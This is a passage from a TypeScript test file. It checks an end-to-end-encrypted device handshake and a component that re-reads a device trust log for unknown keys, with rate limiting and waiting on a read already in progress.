    await dispatchDown(socket, { type: 'e2e_hello', payload: { identityPub: pub, ephPub: C.b64e(eph.pub), sig: C.b64e(C.helloSig(identity.priv, MACHINE, eph.pub)) } }, 'web-1')
    await vi.waitFor(() => expect(queuedFor(socket, 'web-1').some((frame) => frame.type === 'e2e_welcome')).toBe(true))
    expect(asked).toEqual([pub])
    expect(socket.remoteClient('web-1')).toMatchObject({ role: 'web', identity: pub })
    await socket.stop()
  })
})

describe('unknownHelloReader', () => {
  const pub = C.b64e(C.newIdentity().pub)

  it('reads the log for a key, says what it found, and not again for the same key within ten seconds', async () => {
    let now = 1_000
    const lines: string[] = []
    const trustFromLog = vi.fn(async (): Promise<DeviceLogTrustOutcome> => 'absent')
    const read = unknownHelloReader({ trustFromLog }, (line) => lines.push(line), () => now)
    await read(pub)
    const fp = C.fingerprint(C.b64d(pub))
    expect(lines).toEqual([
      `[e2ee] hello from ${fp} is not paired here — re-reading the device log`,
      `[e2ee] ${fp}: not on the account's device list`,
    ])
    now += 9_999
    await read(pub)
    expect(trustFromLog).toHaveBeenCalledTimes(1)
    now += 1
    trustFromLog.mockResolvedValueOnce('trusted')
    await read(pub)
    expect(trustFromLog).toHaveBeenCalledTimes(2)
    expect(lines.at(-1)).toBe(`[e2ee] ${fp}: trusted: it is on the account's device list`)
  })

  it('makes a hello said again while the read is on its way wait for that read, not be denied at once', async () => {
    let finish!: (outcome: DeviceLogTrustOutcome) => void
    const trustFromLog = vi.fn(() => new Promise<DeviceLogTrustOutcome>((resolve) => { finish = resolve }))
    const read = unknownHelloReader({ trustFromLog }, () => {}, () => 1_000)
    let firstDone = false
    let againDone = false
    void read(pub).then(() => { firstDone = true })
    void read(pub).then(() => { againDone = true })
    await Promise.resolve()
    expect(againDone).toBe(false)
    finish('trusted')
    await new Promise((resolve) => setTimeout(resolve, 0))
    expect([firstDone, againDone]).toEqual([true, true])
    expect(trustFromLog).toHaveBeenCalledTimes(1)
  })
})
